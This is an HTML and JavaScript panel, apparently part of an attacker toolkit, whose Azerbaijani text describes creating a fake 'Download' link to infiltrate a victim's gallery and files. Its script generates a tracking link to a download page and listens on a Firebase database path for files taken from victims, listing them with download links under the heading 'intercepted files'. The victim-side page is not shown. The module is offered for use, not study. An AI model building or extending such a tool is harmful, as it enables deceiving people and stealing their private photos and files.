<div id="file-trap-module" style="color: #ff9900; font-family: 'Outfit', sans-serif; padding: 20px; background: #0a0500; border: 1px solid #331a00; border-radius: 15px;">
    <div style="text-align: center; margin-bottom: 20px;">
        <i class="fas fa-folder-open" style="font-size: 3rem; color: #ff9900;"></i>
        <h3 style="font-family: 'Syncopate'; font-size: 0.8rem;">FILE EXPLORER TRAP</h3>
    </div>

    <div id="setup-file">
        <p style="font-size: 0.7rem; opacity: 0.7;">Qurbanın qalereyasına və fayllarına sızmaq üçün saxta "Yükləmə" linki yaradın.</p>
        <button onclick="genFileTrap()" style="width: 100%; padding: 15px; background: #ff9900; color: black; border: none; font-weight: 900; border-radius: 10px; margin-top: 10px;">LİNKİ GENERASİYA ET</button>
    </div>

    <div id="file-results" style="display: none; margin-top: 20px;">
        <div style="background: #000; padding: 10px; border: 1px dashed #ff9900; color: #ff9900; font-size: 0.7rem; word-break: break-all;" id="f-link"></div>
        <div style="margin-top: 20px;">
            <h4 style="font-size: 0.7rem;"><i class="fas fa-file-download"></i> ƏLƏ KEÇƏN FAYLLAR</h4>
            <div id="intercepted-files" style="height: 150px; overflow-y: auto; background: rgba(255,153,0,0.05); border-radius: 10px; padding: 10px; font-size: 0.65rem;">
                Gözlənilir...
            </div>
        </div>
    </div>
</div>

<script>
    function genFileTrap() {
        const uid = localStorage.getItem('elite_session');
        const link = window.location.origin + "/download.html?ref=" + uid;
        document.getElementById('f-link').innerText = link;
        document.getElementById('setup-file').style.display = 'none';
        document.getElementById('file-results').style.display = 'block';
        
        // Firebase dinləyicisi (Fayllar gələndə bura düşür)
        db.ref('file_traps/' + uid).on('child_added', snap => {
            const file = snap.val();
            document.getElementById('intercepted-files').innerHTML += `
                <div style="border-bottom: 1px solid #222; padding: 5px;">
                    📄 ${file.name} (${file.size}) <br>
                    <a href="${file.url}" target="_blank" style="color: #00ff00;">YÜKLƏ</a>
                </div>`;
        });
    }
</script>
